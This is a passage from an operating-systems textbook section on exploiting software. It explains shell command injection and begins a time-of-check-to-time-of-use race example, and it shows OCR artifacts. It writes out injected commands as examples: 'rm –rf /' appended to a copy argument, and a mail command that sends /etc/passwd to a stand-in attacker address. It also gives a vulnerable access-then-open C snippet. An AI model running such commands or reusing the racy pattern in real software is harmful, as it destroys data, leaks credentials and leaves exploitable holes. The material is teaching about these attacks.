@@ -1,0 +1,40 @@
+SEC. 9.5
+EXPLOITING SOFTWARE
+667
+the user types ‘‘abc’’ and ‘‘xyz; rm –rf /’’ instead. The command that is constructed
+and executed is now
+cp abc xyz; rm –rf /
+which first copies the file, then attempts to recursively remove every file and every
+directory in the entire file system. If the program is running as superuser, it may
+well succeed. The problem, of course, is that everything following the semicolon
+is executed as a shell command.
+Another example of the second argument might be ‘‘xyz; mail 
+snooper@badguys.com </etc/passwd’’, which produces
+cp abc xyz; mail snooper@bad-guys.com </etc/passwd
+thereby sending the password file to an unknown and untrusted address.
+9.5.8 Time of Check to Time of Use Attacks
+The last attack in this section is of a different nature. It has nothing to do with
+memory corruption or command injection. Instead, it exploits race conditions. As
+always, it can best be illustrated with an example. Consider the code below:
+int fd;
+if (access ("./my document", W OK) != 0) {
+exit (1);
+fd = open ("./my document", O WRONLY)
+wr ite (fd, user input, sizeof (user input));
+We assume again that the program is SETUID root and the attacker wants to
+use its privileges to write to the password file. Of course, she does not have write
+permission to the password file, but let us have a look at the code. The first thing
+we note is that the SETUID program is not supposed to write to the password file
+at all—it only wants to write to a file called ‘‘my document’’ in the current 
+working directory. Howev er, even though a user may have this file in her current 
+working directory, it does not mean that she really has write permission to this file. For
+instance, the file could be a symbolic link to another file that does not belong to the
+user at all, for example, the password file.
+To prevent this, the program performs a check to make sure the user has write
+access to the file by means of the access system call. The call checks the actual
+file (i.e., if it is a symbolic link, it will be dereferenced so the target file will be
+checked), returning 0 if the requested access is allowed and an error value of <1
+otherwise. Moreover, the check is carried out with the calling process’ real UID,
+rather than the effective UID (because otherwise a SETUID process would always
+have access). Only if the check succeeds will the program proceed to open the file
+and write the user input to it.
